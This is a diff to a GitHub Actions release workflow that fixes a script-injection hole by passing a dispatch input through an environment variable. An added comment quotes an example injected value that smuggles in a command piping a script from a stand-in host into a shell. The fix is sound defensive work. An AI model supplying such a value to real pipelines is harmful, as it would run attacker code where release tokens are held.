@@ -89,4 +89,11 @@ jobs:
           # published` to other workflows (GitHub blocks the recursion),
           # which silently breaks brew-update.yml.
           GITHUB_TOKEN: ${{ steps.token.outputs.token }}
-        run: pnpm release-it ${{ github.event.inputs.version }} --ci
+          # Pass the workflow_dispatch input through an env var, never inline
+          # ${{ … }} interpolation, so a dispatch value like
+          # `minor; curl evil | sh #` can't break out of the `run:` shell and
+          # execute arbitrary code in a job holding the App token + id-token:
+          # write (GHA script-injection). ${VAR:+"$VAR"} preserves the
+          # "empty input on nightly → no positional arg" behaviour.
+          RELEASE_VERSION: ${{ github.event.inputs.version }}
+        run: pnpm release-it ${RELEASE_VERSION:+"$RELEASE_VERSION"} --ci
